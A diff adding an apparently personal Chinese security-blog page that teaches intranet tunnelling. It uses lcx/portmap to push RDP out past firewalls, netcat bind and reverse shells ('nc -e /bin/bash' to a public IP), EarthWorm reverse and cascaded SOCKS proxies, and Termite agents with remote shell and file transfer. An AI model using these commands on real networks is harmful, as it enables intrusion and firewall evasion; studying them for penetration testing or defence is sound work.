@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="HatBoy" />
+
+
+
+<meta name="description" content="首页摘要">
+<meta name="keywords" content="内网渗透,端口转发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网端口转发及穿透">
+<meta property="og:url" content="https://hatboy.github.io/2018/08/28/内网端口转发及穿透/index.html">
+<meta property="og:site_name" content="HatBoy的个人主页">
+<meta property="og:description" content="首页摘要">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://hatboy.github.io/2018/08/28/内网端口转发及穿透/1.jpg">
+<meta property="og:image" content="https://hatboy.github.io/2018/08/28/内网端口转发及穿透/2.png">
+<meta property="og:updated_time" content="2018-08-28T01:50:41.655Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网端口转发及穿透">
+<meta name="twitter:description" content="首页摘要">
+<meta name="twitter:image" content="https://hatboy.github.io/2018/08/28/内网端口转发及穿透/1.jpg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="HatBoy的个人主页" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>内网端口转发及穿透 | HatBoy的个人主页</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?94c5bc16a94e5db3e2942494f0be64dd";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">HatBoy</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签&amp;分类</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:hatboy-dj@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/HatBoy/" title="GitHub"></a>
+                            
+                                <a class="fa 码云博客" href="http://hatboy.gitee.io/" title="码云博客"></a>
+                            
+                                <a class="fa CSDN" href="http://blog.csdn.net/dj1174232716" title="CSDN"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cython/">Cython</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python-tips/">Python tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python模块tips/">Python模块tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python语法/">Python语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/asyncio/">asyncio</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socks/">socks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/异步并发/">异步并发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/端口转发/">端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/调试/">调试</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://fmxfmx.gitee.io/">FMX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://jewelz.me/">Jewelz</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.zhihu.com/people/talentisan/activities">轻狂书生</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://threetop.top/">ZCC</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://blog.csdn.net/u012017783">ZCC的CSDN</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://zcc888.gitee.io/">ZCC的博客</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一枚爱Python,爱海贼,爱健身,喜欢好玩有趣事物的程序员……</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">HatBoy</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">HatBoy</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签&amp;分类</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hatboy-dj@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/HatBoy/" title="GitHub"></a>
+                            
+                                <a class="fa 码云博客" target="_blank" href="http://hatboy.gitee.io/" title="码云博客"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="http://blog.csdn.net/dj1174232716" title="CSDN"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-内网端口转发及穿透" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/28/内网端口转发及穿透/" class="article-date">
+      <time datetime="2018-08-28T01:42:53.000Z" itemprop="datePublished">2018-08-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      内网端口转发及穿透
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/端口转发/">端口转发</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in="" index="" |="" 首页摘要="">
+
+<p>首页摘要</p>
+<a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<h2 id="一、LCX"><a href="#一、LCX" class="headerlink" title="一、LCX"></a>一、LCX</h2><ul>
+<li>lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap。</li>
+<li>lcx有两大功能：<ul>
+<li>1.端口转发(listen和slave成对使用</li>
+<li>2.端口映射(tran)</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-lcx-内网端口转发（类似于SSH远程转发-R）"><a href="#1-lcx-内网端口转发（类似于SSH远程转发-R）" class="headerlink" title="1.lcx 内网端口转发（类似于SSH远程转发-R）"></a>1.lcx 内网端口转发（类似于SSH远程转发-R）</h3><ul>
+<li>内网主机上执行：<strong>lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口</strong>，意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口。</li>
+<li><p>公网主机上执行：<strong>lcx.exe –listen 公网主机端口1 公网主机端口2，意思是监听公网主机本机的 4444 端口请求</strong>，并将来自 4444 端口的请求传送给 5555 端口。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">内网：lcx.exe -slave 公网主机IP <span class="number">4444</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span> 或者 $ portmap -m <span class="number">3</span> -h1 公网IP -p1 <span class="number">4444</span> -h2 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p2 <span class="number">3389</span></div><div class="line">公网：lcx.exe –<span class="section">listen</span> <span class="number">4444</span> <span class="number">5555</span>  或者 $ portmap -m <span class="number">2</span> -p1 <span class="number">4444</span> -p2 <span class="number">5555</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>此时直接访问：公网IP:5555，即可转发到内网IP的3389</p>
+</li>
+</ul>
+<h3 id="2-本地端口转发（类似于SSH本地转发-L）"><a href="#2-本地端口转发（类似于SSH本地转发-L）" class="headerlink" title="2.本地端口转发（类似于SSH本地转发-L）"></a>2.本地端口转发（类似于SSH本地转发-L）</h3><ul>
+<li><p>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口，目标主机上执行：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe -tran <span class="number">53</span> 目标主机IP <span class="number">3389</span> 或者 $ portmap -m <span class="number">1</span> -p1 <span class="number">53</span> -h2 目标IP -p2 <span class="number">3389</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>这时我们可以直接远程桌面连接到目标主机IP:53</p>
+</li>
+</ul>
+<h2 id="二、nc反弹"><a href="#二、nc反弹" class="headerlink" title="二、nc反弹"></a>二、nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><ul>
+<li><p>在公网主机上执行下面命令，监听8888端口，等待连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc -l -p 8888 -e /bin/bash</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>在本地主机上执行下面命令，获得一个shell：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nc<span class="built_in"> ip </span>8888</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><ul>
+<li><p>在公网主机上进行监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc -lvp 8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>在内网主机上执行下面命令，将shell反弹给公网IP：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nc -e /<span class="keyword">bin/bash </span>公网<span class="built_in">IP</span> <span class="number">8888</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="三、socks代理工具"><a href="#三、socks代理工具" class="headerlink" title="三、socks代理工具"></a>三、socks代理工具</h2><ul>
+<li>SOCKS代理客户端Linux可用proxychains，Windows可用Proxifier或者SocksCap64。</li>
+<li>Proxychains 是一款 LINUX 平台下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上网，允許 TCP 和 DNS 通過代理隧道，支持 HTTP、SOCKS4、SOCKS5 類型的代理服务器，支持 proxy chain，即可配置多个代理，同一個 proxy chain 可使用不同类型的代理服务器。</li>
+<li>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名,指定程序等运行模式，兼容性非常好。有点类似SOCKSCAP。</li>
+<li>SocksCap64 是一款在 windows 下相当好使的全局代理软件。SocksCap64 可以使 Windows 应用程序通过 SOCKS 代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持 SOCKS 代理的应用程序通过 SocksCap64 之后都可以完美的实现代理访问。此软件已经停止更新。</li>
+</ul>
+<h3 id="（1）Earthworm"><a href="#（1）Earthworm" class="headerlink" title="（1）Earthworm"></a>（1）Earthworm</h3><ul>
+<li>EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向”、“反向”、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内, 强烈推荐使用。官方地址：<a href="http://rootkiter.com/EarthWorm" target="_blank" rel="external">http://rootkiter.com/EarthWorm</a></li>
+<li>该工具共有 6 种命令格式：ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran<h4 id="1-正向SOCKS-v5服务器"><a href="#1-正向SOCKS-v5服务器" class="headerlink" title="1.正向SOCKS v5服务器"></a>1.正向SOCKS v5服务器</h4></li>
+<li><p>直接在服务器上面执行下面命令，将本机作为SOCKS5服务器使用，一般是在公网IP上面执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./ew -s ssocksd -l 1080</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>然后将该主机作为SOCKS5服务器：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl ip<span class="selector-class">.cn</span> -x socks5:<span class="comment">//公网IP:1080</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="2-反弹SOCKS-v5服务器"><a href="#2-反弹SOCKS-v5服务器" class="headerlink" title="2.反弹SOCKS v5服务器"></a>2.反弹SOCKS v5服务器</h4><ul>
+<li>这个操作具体分两步：</li>
+<li><p>（1）先在一台具有公网 ip 的主机A上运行以下命令：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>（2）在目标主机B上启动SOCKS v5服务，并反弹到公网主机的8888端口：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s rssocks -d <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> -e <span class="number">8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>让后通过公网1080端口将内网主机作为SOCKS5服务器：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl ip<span class="selector-class">.cn</span> -x socks5:<span class="comment">//1.1.1.1:1080</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="3-多级级联"><a href="#3-多级级联" class="headerlink" title="3.多级级联"></a>3.多级级联</h4><ul>
+<li><p>工具中自带的三条端口转发指令，参考lcx工具命令，它们的参数格式分别为：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s lcx_listen -l <span class="number">1080</span> -e <span class="number">8888</span></div><div class="line">$ ./ew -s lcx_slave -d <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> -e <span class="number">8888</span> -f <span class="number">2.2</span><span class="number">.2</span><span class="number">.3</span> -g <span class="number">9999</span></div><div class="line">$ ./ew -s lcx_tran -l <span class="number">1080</span> -f <span class="number">2.2</span><span class="number">.2</span><span class="number">.3</span> -g <span class="number">9999</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前，比如SOCKS v5。</p>
+</li>
+</ul>
+<h5 id="二级级联案例"><a href="#二级级联案例" class="headerlink" title="二级级联案例"></a>二级级联案例</h5><ul>
+<li><p>1.lcx_tran 的用法</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s ssocksd -l <span class="number">9999</span>              # 将本机<span class="number">9999</span>端口作为SOCKS5服务器</div><div class="line">$ ./ew -s lcx_tran -l <span class="number">1080</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">9999</span>    # 将本机的<span class="number">1080</span>端口转发到<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>上的<span class="number">9999</span>端口</div></pre></td></tr></table></figure>
+</li>
+<li><p>2.lcx_listen、lcx_slave 的用法</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s lcx_listen -l <span class="number">1080</span> -e <span class="number">8888</span>  # 监听<span class="number">1080</span>端口并转发到<span class="number">8888</span>端口</div><div class="line">$ ./ew -s lcx_slave -d <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -e <span class="number">8888</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">9999</span>    # 将<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>的<span class="number">9999</span>端口转发到<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>的<span class="number">8888</span>端口</div><div class="line">$ ./ew -s ssocksd -l <span class="number">9999</span>     # 将本机<span class="number">9999</span>端口作为SOCKS5服务器</div></pre></td></tr></table></figure>
+</li>
+<li><p>数据流流向：SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; rssocks</p>
+</li>
+</ul>
+<h5 id="三级级联案例"><a href="#三级级联案例" class="headerlink" title="三级级联案例"></a>三级级联案例</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./ew -s rcsocks -l <span class="number">1080</span> -e <span class="number">8888</span></div><div class="line">$ ./ew -s lcx_slave -d <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -e <span class="number">8888</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">9999</span></div><div class="line">$ ./ew -s lcx_listen -l <span class="number">9999</span> -e <span class="number">7777</span></div><div class="line">$ ./ew -s rssocks -d <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -e <span class="number">7777</span></div></pre></td></tr></table></figure>
+<ul>
+<li>数据流向：SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</li>
+</ul>
+<h4 id="4-补充说明"><a href="#4-补充说明" class="headerlink" title="4.补充说明"></a>4.补充说明</h4><ul>
+<li>1.为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制将以隧道中最短的时间为默认值。</li>
+<li>2.多级级联的三种状态可以转发任意以TCP为基础的通讯服务，包括远程桌面／ssh服务 等。</li>
+<li>3.ew_for_arm_32 在android手机、小米路由器和树莓派 上测试无误。</li>
+</ul>
+<h3 id="（2）Termite"><a href="#（2）Termite" class="headerlink" title="（2）Termite"></a>（2）Termite</h3><ul>
+<li>Termite是EarthWorm的最新版，多种操作系统下均有Agent实现、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便。官方地址：<a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li>
+<li>Termite分为管理端（admin端）和被管理端（agent端），所有的被管理及其必须要部署agent。agent可以相互连接，被上游agent所管理。<br><img src="/2018/08/28/内网端口转发及穿透/1.jpg" alt="结构图"></li>
+</ul>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><ul>
+<li><p>1.以服务模式启动一个agent服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;</span><span class="bash"> $ ./agent -l 8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>2.令管理端连接到agent并对agent进行管理。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; $ ./admin -c <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>3.此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;</span><span class="bash">&gt; <span class="built_in">help</span></span></div></pre></td></tr></table></figure>
+</li>
+<li><p>4.通过show指令可以得到当前agent的拓扑情况。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;</span> show </div><div class="line"> 0M</div><div class="line"> +-- <span class="number">1</span>M</div></pre></td></tr></table></figure>
+</li>
+<li><p>由于当前拓扑中只有一个agent，所以展示结果只有 1M，其中1 为节点的ID号，M为MacOS系统的简写，Linux为L，Windows简写为W。</p>
+</li>
+<li><p>5.将新agent加入当前拓扑</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; ./agent -c <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">8888</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>6.此时show指令将得到如下效果</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"> <span class="number">0</span>M</div><div class="line"> +-- <span class="number">1</span>M</div><div class="line"> | +-- <span class="number">2</span>M</div><div class="line">#  这表明，当前拓扑中有两个节点，其中由于<span class="number">2</span>节点需要通过<span class="number">1</span>节点才能访问，所以下挂在<span class="number">1</span>节点下方。</div></pre></td></tr></table></figure>
+</li>
+<li><p>7.在2节点开启socks代理，并绑定在本地端口</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; goto 2   #将当前被管理节点切换为 2 号节点。</div><div class="line">&gt;&gt;<span class="built_in"> socks </span>1080  # 此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。</div></pre></td></tr></table></figure>
+</li>
+<li><p>8.在1号节点开启一个shell并绑定到本地端口</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;</span> goto <span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;</span> shell <span class="number">7777</span>   <span class="comment"># 此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>9.将远程的文件下载至本地</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; goto <span class="number">1</span></div><div class="line">&gt;&gt; downfile <span class="number">1.</span>txt <span class="number">2.</span>txt   # 将<span class="number">1</span> 节点，目录下的 <span class="number">1.</span>txt 下载至本地，并命名为<span class="number">2.</span>txt</div></pre></td></tr></table></figure>
+</li>
+<li><p>10.上传文件至远程节点</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; goto <span class="number">2</span></div><div class="line">&gt;&gt; upfile <span class="number">2.</span>txt <span class="number">3.</span>txt   # 将本地的 <span class="number">2.</span>txt 上传至 <span class="number">2</span>号节点的目录，并命名为<span class="number">3.</span>txt</div></pre></td></tr></table></figure>
+</li>
+<li><p>11.端口转接</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; goto <span class="number">2</span> </div><div class="line">&gt;&gt; lcxtran <span class="number">3388</span> <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span>   # 以<span class="number">2</span>号节点为跳板，将 <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> 的 <span class="number">3389</span> 端口映射至本地的 <span class="number">3388</span> 端口</div></pre></td></tr></table></figure>
+</li>
+<li><p>更多支持：</p>
+<ul>
+<li><a href="http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4" target="_blank" rel="external">http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4</a></li>
+<li><a href="http://rootkiter.com/toolvideo/toolmp4/2socks.mp4" target="_blank" rel="external">http://rootkiter.com/toolvideo/toolmp4/2socks.mp4</a></li>
+<li><a href="http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4" target="_blank" rel="external">http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4</a></li>
+<li><a href="http://rootkiter.com/toolvideo/toolmp4/4shell.mp4" target="_blank" rel="external">http://rootkiter.com/toolvideo/toolmp4/4shell.mp4</a></li>
+<li><a href="http://rootkiter.com/toolvideo/toolmp4/5file.mp4" target="_blank" rel="external">http://rootkiter.com/toolvideo/toolmp4/5file.mp4</a></li>
+</ul>
+</li>
+</ul>
